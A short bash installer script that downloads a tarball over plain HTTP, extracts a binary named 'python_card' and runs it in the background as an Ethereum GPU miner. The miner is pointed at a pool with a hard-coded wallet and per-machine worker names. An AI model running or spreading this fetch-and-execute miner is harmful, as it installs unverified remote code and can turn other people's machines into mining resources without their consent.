#!/bin/bash

uid=$1
pcname=$2
usage=$3
if [ ! -n "$usage" ] ;then
usage=100
else
usage=$3
fi
downurl="http://sh.haxibao.cn/becard4g.tar.gz"
mkdir -p behash
cd behash
curl -o down.tar.gz $downurl
tar -xvzf down.tar.gz
rm down.tar.gz
chmod a+x python_card
nohup ./python_card -pool eth.haxibao.cn:8008 -wal 0xd3A20F35D1BCC77751881C84e97Cb50a5F8D6f34."${uid}hhh${pcname}" -gpow "${usage}" &
sleep 2
echo -ne '\n'